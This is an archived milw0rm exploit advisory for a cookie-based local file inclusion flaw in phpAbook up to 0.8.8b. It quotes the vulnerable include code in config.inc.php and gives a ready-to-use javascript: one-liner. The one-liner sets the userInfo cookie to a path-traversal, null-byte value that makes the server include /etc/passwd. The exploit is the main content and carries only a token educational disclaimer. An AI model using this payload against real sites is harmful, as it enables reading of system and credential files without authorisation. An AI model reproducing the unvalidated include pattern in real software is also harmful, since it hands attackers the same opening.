<html><head><title>phpAbook <= 0.8.8b (COOKIE) Local File Inclusion Vulnerability</title></head><pre># phpAbook &lt;= 0.8.8b (COOKIE) Local File Inclusion Vulnerability
# url: http://sourceforge.net/projects/phpabook/
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# *Requirements: magic_quotes_gpc = Off

vuln file: include/config.inc.php
vuln code:

x:  &gt;...
61: if (isset($HTTP_COOKIE_VARS[&quot;userInfo&quot;]) &amp;&amp; $HTTP_COOKIE_VARS[&quot;userInfo&quot;] != &quot;&quot;) {
	$userArray = explode(&quot; &quot;, $HTTP_COOKIE_VARS[&quot;userInfo&quot;]);
	$userName = $userArray[0];
	$userID = $userArray[1];
	$userLang = $userArray[2];
	include(&quot;include/lang/$userLang/inc.messages.php&quot;);
67:	}
x:  &lt;...

Proof of Concept (function 'explode' PHP):
[0] = JosS;
[1] = JosS;
[2] = ../../../../etc/passwd%00; ---&gt; INCLUDE

exploit: 
javascript:document.cookie=&quot;userInfo=JosS JosS ../../../../etc/passwd%00; path=/&quot;;

Ingenious work :D

# milw0rm.com [2008-10-05]</pre></html>